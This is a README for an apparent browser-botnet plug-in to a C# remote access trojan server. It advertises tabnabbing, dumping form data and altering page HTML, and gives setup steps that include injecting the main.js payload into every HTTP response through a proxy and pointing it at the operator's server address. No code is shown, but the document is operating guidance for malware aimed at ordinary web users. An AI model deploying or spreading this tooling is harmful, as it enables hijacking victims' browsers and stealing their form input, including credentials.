# Javascript Botent
This is a botnet based on javascript to hack into users browsers.  
This project is a plug-in for the [C# R.A.T Server](https://github.com/AdvancedHacker101/C-Sharp-R.A.T-Server) Project.  
Some key functions are:
- TabNabbing
- Form Data Dumping
- Replacing and adding html content

## Installation
### Server Side
1. Put the WebPlugin.dll file from WebPlugin/bin/Debug into TutServer/bin/Debug/scripts  
2. Start TutServer.exe  
3. Switch to the tab "Plugins"  
4. Select WebPlugin.dll from the list  
5. Click Execute  
6. Enter a port for the server to run on for example **80**

**Note:** this is a separate socket server from the normal windows and linux client one, choose a different port from 100  
This is only a plugin and using it is **optional**, it won't break the c# R.A.T Server in any cases  

### Client Side
We have 2 options here:
- Create a test website which loads WebPlugin/bin/Debug/C# R.A.T Browser/main.js (btw. testSite.html does this)
- Or inject main.js into every http packet with for example the [C# Proxy Server](https://github.com/AdvancedHacker101/C-Sharp-Proxy-Server)

**Note:** Don't forget to re-write the ip and port in the main.js file, it's in a variable named serverLocation at the 17th line  
For additional resources read:  
- [The Code of Conduct](https://github.com/AdvancedHacker101/Javascript-Botnet-C-Sharp/blob/master/CODE_OF_CONDUCT.md)
- [How to contribute](https://github.com/AdvancedHacker101/Javascript-Botnet-C-Sharp/blob/master/CONTRIBUTING.md)
- [The licence file](https://github.com/AdvancedHacker101/Javascript-Botnet-C-Sharp/blob/master/LICENSE)
- [Complete list of commands](https://github.com/AdvancedHacker101/Javascript-Botnet-C-Sharp/blob/master/Commands.md)
